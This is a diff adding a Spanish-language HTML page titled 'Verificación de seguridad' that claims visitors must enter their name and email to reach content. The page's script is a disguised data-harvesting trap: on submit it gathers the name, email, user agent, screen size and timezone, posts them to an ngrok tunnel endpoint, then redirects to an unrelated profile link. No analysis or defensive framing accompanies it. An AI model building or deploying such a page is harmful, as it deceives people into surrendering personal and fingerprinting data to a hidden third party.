@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Verificación de seguridad</title>
+    <style>
+        body { font-family: Arial; max-width: 400px; margin: 50px auto; }
+        input, button { width: 100%; padding: 10px; margin: 5px 0; }
+        button { background: #007BFF; color: white; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h2>Verificación de seguridad</h2>
+    <p>Para continuar, ingrese su nombre y correo electrónico. (Esto es obligatorio para acceder al contenido)</p>
+    <form id="form">
+        <input type="text" id="nombre" placeholder="Nombre completo" required>
+        <input type="email" id="correo" placeholder="Correo electrónico" required>
+        <button type="submit">Verificar</button>
+    </form>
+    <script>
+        document.getElementById('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const data = {
+                nombre: document.getElementById('nombre').value,
+                correo: document.getElementById('correo').value,
+                ua: navigator.userAgent,
+                screen: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            fetch('https://roast-skinning-paralysis.ngrok-free.dev/collect', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).then(() => {
+                window.location.href = 'https://guns.lol/penthouseintokyo';
+            });
+        });
+    </script>
+</body>
+</html>
